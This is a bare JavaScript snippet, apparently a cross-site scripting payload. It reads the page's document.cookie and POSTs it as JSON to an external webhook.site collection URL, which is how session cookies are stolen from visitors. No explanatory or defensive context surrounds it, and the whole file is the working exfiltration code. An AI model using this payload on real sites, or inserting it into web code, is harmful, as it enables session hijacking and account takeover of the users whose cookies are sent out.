const data = {
  message: document.cookie
};

fetch('https://webhook.site/d035f84d-52a7-4f84-af02-2a47782a8150', {
  method: 'POST',
  headers: {
    'Content-Type': 'application/json'
  },
  body: JSON.stringify(data)
})
